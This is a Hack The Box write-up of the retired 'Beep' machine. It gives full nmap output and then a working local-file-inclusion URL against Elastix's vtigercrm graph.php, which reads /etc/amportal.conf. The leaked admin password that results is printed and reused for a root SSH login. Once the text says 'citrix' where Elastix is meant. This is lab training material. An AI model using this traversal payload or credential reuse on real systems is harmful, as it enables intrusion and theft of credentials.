# Solution for Beep - Retired - HacktheBox

## Enumeration
```text
┌──(hanoz㉿kali)-[~/Desktop/htb/beep]
└─$ sudo nmap -sV -sC -A -O -p- 10.10.10.7                                                                                                                                                                                               1 ⨯
[sudo] password for hanoz: 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-15 10:03 EST
Stats: 0:02:28 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 93.75% done; ETC: 10:06 (0:00:09 remaining)
Stats: 0:05:53 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.48% done; ETC: 10:09 (0:00:02 remaining)
Nmap scan report for 10.10.10.7
Host is up (0.011s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: EXPIRE(NEVER) LOGIN-DELAY(0) UIDL APOP TOP STLS RESP-CODES IMPLEMENTATION(Cyrus POP3 server v2) USER AUTH-RESP-CODE PIPELINING
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: Completed OK URLAUTHA0001 SORT=MODSEQ MAILBOX-REFERRALS THREAD=ORDEREDSUBJECT LIST-SUBSCRIBED CATENATE IMAP4rev1 UNSELECT CHILDREN ANNOTATEMORE IMAP4 LISTEXT IDLE QUOTA MULTIAPPEND CONDSTORE ATOMIC X-NETSCAPE LITERAL+ THREAD=REFERENCES SORT BINARY ID ACL UIDPLUS NAMESPACE RENAME STARTTLS RIGHTS=kxte NO
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2022-01-15T16:07:15+00:00; +1h00m00s from scanner time.
878/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
44

45/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/15%OT=22%CT=1%CU=31696%PV=Y%DS=2%DC=T%G=Y%TM=61E2E3D
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=CC%GCD=1%ISR=CE%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11N
OS:W7%O6=M505ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R
OS:=Y%DF=Y%T=40%W=16D0%O=M505NNSNW7%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M505ST11NW7%RD=0%
OS:Q=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%
OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%
OS:DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIP
OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Host script results:
|_clock-skew: 59m59s

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   11.68 ms 10.10.14.1
2   11.84 ms 10.10.10.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 407.45 seconds
```

HTTP Servers:
You get directed to an elastix Login
From a simple google search, we see that
```text
Elastix is an unified communications server software that brings together IP PBX, email, IM, faxing and collaboration functionality.
```

So that explains why SMTP, IMAP, POP3 and several other communication service ports are open. Cool. 
Default passwords don't seem to work here.
There are a few vulnerabilties associated with it, but let's first explore the machine a bit more

On port 10000, there is a webmin login page. Let's see what is happening
The default login fails here too, so we will have to try something else.

There is an RCE associated with webmin, but it requires a password. We will have to somehow find it first. 

When we try to login to MySQL, we are greeted with this message
```text
┌──(hanoz㉿kali)-[~/Desktop/htb/beep]
└─$ mysql -h 10.10.10.7                                                                                          1 ⨯
ERROR 1130 (HY000): Host '10.10.14.9' is not allowed to connect to this MySQL server
```

Now, we try to exploit citrix. We can see that there is an LFI vulnerability in searchsploit. 
```text
searchsploit -m php/webapps/37637.pl
```

We copy paste the payload as 

```text
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

From the text of the page, we can see that passwords are exposed. We can get the credentials to login to the service. 

```text
admin
jEhdIekWmdjE
```

We can see that from the revealed page, the same password is being used pretty much everywhere. So maybe we can use it to login as root?

Let's try
```text
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7
```

Yup, we are able to get both the user and root password.
